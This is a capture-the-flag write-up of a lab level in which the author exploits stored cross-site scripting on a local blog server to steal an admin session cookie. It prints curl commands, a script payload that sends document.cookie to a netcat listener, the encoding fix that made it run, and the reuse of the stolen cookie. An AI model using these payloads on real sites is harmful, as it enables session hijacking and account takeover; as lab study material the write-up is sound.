# XSS TO ADMIN COOKIE


In this level I had to use cross site scripting to inject javascript into the given server. The idea was, I login as a user, perform XSS, the victim logs in as admin, the XSS executes and I get the results. 
Now the results in this case was the hidden and encoded admin session cookie, which I can use to do all sorts of things and most importantly, get the flag.

From the source code of the server file I could observe.

`@app.route("/login", methods=["POST"])`

`@app.route("/draft", methods=["POST"])`

`@app.route("/publish", methods=["POST"])`

`@app.route("/", methods=["GET"])`

These endpoints gave me a fair idea of which endpoints I have to use for what purpose.
The users on the server were as follows.

```python
db = TemporaryDB()

db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])

db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [flag[-20:]])

db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")

db.execute("""INSERT INTO users SELECT "hacker" as username, "1337" as password""")
```

From this I could clearly see the username and password to the 'guest' and 'hacker' user.
So I decided to log into the server using the 'hacker' username, as one would, and get the cookie of that session.

```bash
>> curl -v -d "username=hacker&password=1337" "http://challenge.localhost/login"
*
*
*
*
< Set-Cookie: auth=hacker|1337; Path=/
< Connection: close
< 
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
* shutting down connection #0
```

After getting the cookie, I used this session to inject my javascript.

```bash
>> curl -v "http://challenge.localhost/draft" -b "auth=hacker|1337" -d "<script>content=fetch(document.cookie)</script>" -d "publish=on"
*
*
< 
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
* shutting down connection #0
```

Then after the victim logged in, it turned out that the syntax for my `fetch()` was all wrong, after going through some documentations I came prepared yet again. With a local listener in another terminal (port: 8080) prepared to catch the data when user logs in. 

` >> nc -lvn 8080`

```bash
>> curl -v "http://challenge.localhost/draft" -b "auth=hacker|1337" -d "content=<script>fetch('http://challenge.localhost:8080/?c=' + encodeURIComponent(document.cookie))</script>" -d "publish=on"
*
*
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
* shutting down connection #0
```

Now here the syntax was spot on! Yet my javascript did not execute when the victim logged in. Then after pondering over it for a while, I noticed.

```html
<h2>Author: hacker</h2><script>fetch('http://challenge.localhost:8080/?c='   encodeURIComponent(document.cookie))</script><hr>
```

The error was clear at a sight, the '+' I had used in my JavaScript was not being registered as a '+' but a ' '. The solution to which was simple, encoding it to '%2B'.

```bash
>> curl -v "http://challenge.localhost/draft" -b "auth=hacker|1337" -d "content=<script>fetch('http://challenge.localhost:8080/?c=' %2B encodeURIComponent(document.cookie))</script>" -d "publish=on"
*
*
< 
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
* shutting down connection #0
```

Now when the victim logged in, 'netcat' caught the desired data with ease.

```bash
>> nc -lvn 8080

Listening on 0.0.0.0 8080
Connection received on 127.0.0.1 54824
GET /?c=auth%3Dadmin%7C<<cookie>> HTTP/1.1
Host: challenge.localhost:8080
```

Here I got the encoded admin session cookie, decoded it back into a usable session, used `curl -v -b "auth=admin|<<cookie>>" "http://challenge.localhost/"`
and smoothly got the flag.
